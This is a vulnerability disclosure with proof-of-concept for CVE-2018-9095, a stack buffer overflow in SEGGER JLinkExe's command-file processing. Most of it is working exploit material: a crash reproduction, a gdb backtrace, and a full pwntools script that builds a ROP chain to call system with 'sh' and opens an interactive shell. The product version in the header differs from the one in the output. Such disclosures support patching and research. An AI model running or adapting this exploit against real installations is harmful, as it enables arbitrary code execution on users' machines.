### JLinkExe CommandFile Buffer Overflow ###

# Product #
JLink v3.60b

# Vulnerability Type #
Buffer Overflow

# CVE Reference #
CVE-2018-9095

# Security Issue #
The JLinkExe binary contains a stack buffer overflow that is triggered when processing JLink command files. This vulnerability can be leveraged to overwrite the functionâ€™s return pointer resulting in arbitrary code execution. If an attacker can trick a user into loading a crafted command file, it can lead to local arbitrary code execution as that user.

# Exploit/POC #

The following was performed on 32-bit Ubuntu 16.04


$ checksec -f ./JLink_Linux_V630b_x86_64/JLinkExe 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY Fortified Fortifiable  FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH
$ ulimit -c unlimited
$ python3 -c "print(('A'*540), end='')" > payload
$ JLink_Linux_V630b_i386/JLinkExe -CommandFile payload
SEGGER J-Link Commander V6.30b (Compiled Feb  2 2018 18:37:38)
DLL version V6.30b, compiled Feb  2 2018 18:37:32


Script file read successfully.
Processing script file...

Unknown command. '?' for help.
Segmentation fault (core dumped)
$ gdb -c core
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word".
[New LWP 1928]
Core was generated by `JLink_Linux_V630b_i386/JLinkExe -CommandFile payload'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0xb7613456 in ?? ()
gdb-peda$ bt
#0  0xb7613456 in ?? ()
#1  0x41414141 in ?? ()
#2  0x4140b609 in ?? ()
#3  0x08048f1c in ?? ()
#4  0x08055813 in ?? ()
#5  0x4140b609 in ?? ()
#6  0x09d17cc0 in ?? ()
Backtrace stopped: previous frame inner to this frame (corrupt stack?)

Below is a POC calling CSH:

CVE-2018-9095.py
=======
from pwn import *
file_name = '/home/uzer/pwnit.txt'
bin_name = '/home/uzer/JLink_Linux_V630b_i386/JLinkExe'

context.arch = 'i386'
context.binary = bin_name
context.local(log_level='debug')
context.os = 'linux'
context.terminal = ['termite', '-e']

elf = ELF(bin_name)

'''
//Chain psudo
0x804ae7c: pop esi; pop edi; pop ebp; ret; //esi = **libc
0x0804ae79: mov eax, esi; pop ebx; pop esi; pop edi; pop ebp; ret; //eax = esi, esi = **libc
0x0804d0b3: add eax, dword ptr [eax]; add byte ptr [ebx + 0x5e], bl; pop edi; pop ebp; ret;  //eax += *eax
0x8048e87: sub eax, esi; pop esi; pop edi; pop ebp; ret; //eax -= esi
0x0804b193: add eax, 0x5b000000; pop esi; pop edi; pop ebp; ret; //eax += 0x5b000000, esi = 0x5b000000-off_to_sys
0x8048e87: sub eax, esi; pop esi; pop edi; pop ebp; ret; //eax -= esi
0x08049841: push esi; call eax; 
'''
rop = ROP(elf, badchars='\x00\x0a\x0d')
rop.call(0x804ae7c)
rop.raw(elf.got.__libc_start_main)
rop.raw(0xaaaaaaaa)
rop.raw(0xaaaaaaaa)
rop.call(0x0804ae79)
rop.raw(0x08088069) #rand writeable text mem
rop.raw(elf.got.__libc_start_main)
rop.raw(0xaaaaaaaa)
rop.raw(0xaaaaaaaa)
rop.call(0x0804d0b3)
rop.raw(0xaaaaaaaa)
rop.raw(0xaaaaaaaa)
rop.call(0x8048e87)
rop.raw(0xaaaaaaaa)
rop.raw(0xaaaaaaaa)
rop.raw(0xaaaaaaaa)
rop.call(0x0804b193)
rop.raw(0x5b000000-0x24130) #system
rop.raw(0xaaaaaaaa)
rop.raw(0xaaaaaaaa)
rop.call(0x8048e87)
rop.raw(next(elf.search('SWOFlush'))+0x6) #'sh\x00'
rop.raw(0xbbbbbbbb)
rop.raw(0x08088069) #rand writeable text mem
rop.call(0x08049841) #push esi, call eax
rop.raw(0x08088069) #rand writeable text mem
rop.raw(0xccccccc1)
rop.exit()
print rop.dump()

f = open(file_name, 'wb')
f.write(b'A'*541)
f.write(str(rop))
f.close()

io = process([bin_name, '-CommandFile', file_name])
io.interactive()
==========

# Network Access #
None

# Severity #
Medium

